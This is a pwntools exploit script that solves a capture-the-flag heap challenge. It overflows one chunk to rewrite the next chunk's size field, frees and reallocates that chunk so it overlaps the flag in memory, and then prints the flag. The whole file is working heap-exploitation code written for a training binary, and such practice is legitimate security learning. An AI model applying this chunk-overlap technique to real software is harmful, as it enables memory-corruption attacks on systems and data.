# idea: malloc 1 -> malloc 2 -> read_flag -> safe_read ` -> overwrite size of chunk 2-> free 2 -> malloc 2 -> safe_write 2-> such that it fill NULL's before the flag -> safe_write 2

from pwn import *
BINARY = "/challenge/babyheap_level19.1"
p = process(BINARY)

# overwrite size of chunk 2
payload = b'\x00' * (864 + 8) + b'\xb1\x03'

p.sendline(b'malloc')
p.sendline(b'1')
p.sendline(b'864')
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'864')
p.sendline(b'read_flag')

p.sendline(b'safe_read')
p.sendline(b'1')
p.send(payload)

p.sendline(b'free')
p.sendline(b'2')

# re-allocate to overlapp the flag area
p.sendline(b'malloc')
p.sendline(b'2')
p.sendline(b'928')

# fill NULL's
p.sendline(b'safe_read')
p.sendline(b'2')
p.send(b'a' * 880)

# print flag
p.sendline(b'safe_write')
p.sendline(b'2')

p.interactive()